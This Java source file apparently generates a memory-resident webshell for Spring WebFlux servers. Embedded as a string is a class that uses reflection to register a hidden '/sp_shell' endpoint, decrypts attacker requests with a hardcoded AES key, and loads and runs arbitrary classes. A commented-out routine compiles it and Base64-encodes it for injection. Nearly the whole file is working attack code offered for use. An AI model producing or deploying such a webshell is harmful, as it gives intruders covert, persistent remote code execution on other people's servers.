package src.main.MemshellGen;


import javax.tools.JavaCompiler;
import javax.tools.JavaFileObject;
import javax.tools.StandardJavaFileManager;
import javax.tools.ToolProvider;
import java.io.*;
import java.util.Base64;

public class memshellGen {
    public static String code = "import org.springframework.core.io.buffer.DataBuffer;\n" +
            "import org.springframework.http.HttpStatus;\n" +
            "import org.springframework.http.ResponseEntity;\n" +
            "import org.springframework.util.Base64Utils;\n" +
            "import org.springframework.web.bind.annotation.PostMapping;\n" +
            "import org.springframework.web.bind.annotation.RequestBody;\n" +
            "import org.springframework.web.reactive.result.method.RequestMappingInfo;\n" +
            "import org.springframework.web.server.ServerWebExchange;\n" +
            "import reactor.core.publisher.Mono;\n" +
            "\n" +
            "import java.lang.reflect.Method;\n" +
            "import java.net.URL;\n" +
            "import java.net.URLClassLoader;\n" +
            "import java.net.URLDecoder;\n" +
            "import java.nio.charset.StandardCharsets;\n" +
            "import java.util.HashMap;\n" +
            "import java.util.List;\n" +
            "import java.util.Map;\n" +
            "\n" +
            "public class menshellGen {\n" +
            "    public static Map<String, Object> store = new HashMap<>();\n" +
            "    public static String pass = \"pass\", md5, xc = \"3c6e0b8a9c15224a\";\n" +
            "\n" +
            "    public static String doInject(Object obj, String path) {\n" +
            "        String msg;\n" +
            "        try {\n" +
            "            md5 = md5(pass + xc);\n" +
            "            Method registerHandlerMethod = obj.getClass().getDeclaredMethod(\"registerHandlerMethod\", Object.class, Method.class, RequestMappingInfo.class);\n" +
            "            registerHandlerMethod.setAccessible(true);\n" +
            "            Method executeCommand = GMemShell.class.getDeclaredMethod(\"cmd\", ServerWebExchange.class);\n" +
            "            RequestMappingInfo requestMappingInfo = RequestMappingInfo.paths(path).build();\n" +
            "            registerHandlerMethod.invoke(obj, new GMemShell(), executeCommand, requestMappingInfo);\n" +
            "            msg = \"ok\";\n" +
            "        } catch (Exception e) {\n" +
            "            e.printStackTrace();\n" +
            "            msg = \"error\";\n" +
            "        }\n" +
            "        return msg;\n" +
            "    }\n" +
            "\n" +
            "    private static Class defineClass(byte[] classbytes) throws Exception {\n" +
            "        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());\n" +
            "        Method method = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
            "        method.setAccessible(true);\n" +
            "        return (Class) method.invoke(urlClassLoader, classbytes, 0, classbytes.length);\n" +
            "    }\n" +
            "\n" +
            "    public byte[] x(byte[] s, boolean m) {\n" +
            "        try {\n" +
            "            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(\"AES\");\n" +
            "            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), \"AES\"));\n" +
            "            return c.doFinal(s);\n" +
            "        } catch (Exception e) {\n" +
            "            return null;\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static String md5(String s) {\n" +
            "        String ret = null;\n" +
            "        try {\n" +
            "            java.security.MessageDigest m;\n" +
            "            m = java.security.MessageDigest.getInstance(\"MD5\");\n" +
            "            m.update(s.getBytes(), 0, s.length());\n" +
            "            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();\n" +
            "        } catch (Exception e) {\n" +
            "        }\n" +
            "        return ret;\n" +
            "    }\n" +
            "\n" +
            "    public static String base64Encode(byte[] bs) throws Exception {\n" +
            "        Class base64;\n" +
            "        String value = null;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object Encoder = base64.getMethod(\"getEncoder\", null).invoke(base64, null);\n" +
            "            value = (String) Encoder.getClass().getMethod(\"encodeToString\", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});\n" +
            "        } catch (Exception e) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Encoder\");\n" +
            "                Object Encoder = base64.newInstance();\n" +
            "                value = (String) Encoder.getClass().getMethod(\"encode\", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});\n" +
            "            } catch (Exception e2) {\n" +
            "            }\n" +
            "        }\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        Class base64;\n" +
            "        byte[] value = null;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", null).invoke(base64, null);\n" +
            "            value = (byte[]) decoder.getClass().getMethod(\"decode\", new Class[]{String.class}).invoke(decoder, new Object[]{bs});\n" +
            "        } catch (Exception e) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[]) decoder.getClass().getMethod(\"decodeBuffer\", new Class[]{String.class}).invoke(decoder, new Object[]{bs});\n" +
            "            } catch (Exception e2) {\n" +
            "            }\n" +
            "        }\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "    @PostMapping(\"/sp_shell\")\n" +
            "    public synchronized ResponseEntity cmd(\n" +
            "            ServerWebExchange pdata) {\n" +
            "        try {\n" +
            "            Object bufferStream = pdata.getFormData().flatMap(c -> {\n" +
            "                StringBuilder result = new StringBuilder();\n" +
            "                try {\n" +
            "                    String id = c.getFirst(pass);\n" +
            "                    byte[] data = x(base64Decode(id), false);\n" +
            "                    if (store.get(\"payload\") == null) {\n" +
            "                        store.put(\"payload\", defineClass(data));\n" +
            "                    } else {\n" +
            "                        store.put(\"parameters\", data);\n" +
            "                        java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();\n" +
            "                        Object f = ((Class) store.get(\"payload\")).newInstance();\n" +
            "                        f.equals(arrOut);\n" +
            "                        f.equals(data);\n" +
            "                        result.append(md5.substring(0, 16));\n" +
            "                        f.toString();\n" +
            "                        result.append(base64Encode(x(arrOut.toByteArray(), true)));\n" +
            "                        result.append(md5.substring(16));\n" +
            "                    }\n" +
            "                } catch (Exception ex) {\n" +
            "                    result.append(ex.getMessage());\n" +
            "                }\n" +
            "                return Mono.just(result.toString());\n" +
            "            });\n" +
            "            return new ResponseEntity(bufferStream, HttpStatus.OK);\n" +
            "        } catch (Exception ex) {\n" +
            "            return new ResponseEntity(ex.getMessage(), HttpStatus.OK);\n" +
            "        }\n" +
            "    }\n" +
            "}";

//    public static void main(String[] args) {
//        try {
//            // Write Java code to .java file
//            File sourceFile = new File("MsShell" + ".java");
//            try (BufferedWriter writer = new BufferedWriter(new FileWriter(sourceFile))) {
//                writer.write(code);
//            }
//
//            // Compile the .java file to .class file
//            JavaCompiler compiler = ToolProvider.getSystemJavaCompiler();
//            StandardJavaFileManager fileManager = compiler.getStandardFileManager(null, null, null);
//            Iterable<? extends JavaFileObject> compilationUnits = fileManager.getJavaFileObjects(sourceFile);
//            compiler.getTask(null, fileManager, null, null, null, compilationUnits).call();
//            fileManager.close();
//
//            // Read the .class file
//            File classFile = new File("MsShell" + ".class");
//            byte[] classBytes = new byte[(int) classFile.length()];
//            try (InputStream is = new FileInputStream(classFile)) {
//                is.read(classBytes);
//            }
//
//            // Encode the .class file bytes to Base64
//            String base64EncodedClass = Base64.getEncoder().encodeToString(classBytes);
//
//            // Print the Base64 encoded string
//            System.out.println("Base64 Encoded Class:");
//            System.out.println(base64EncodedClass);
//
//            // Clean up
//            sourceFile.delete();
//            classFile.delete();
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//    }

}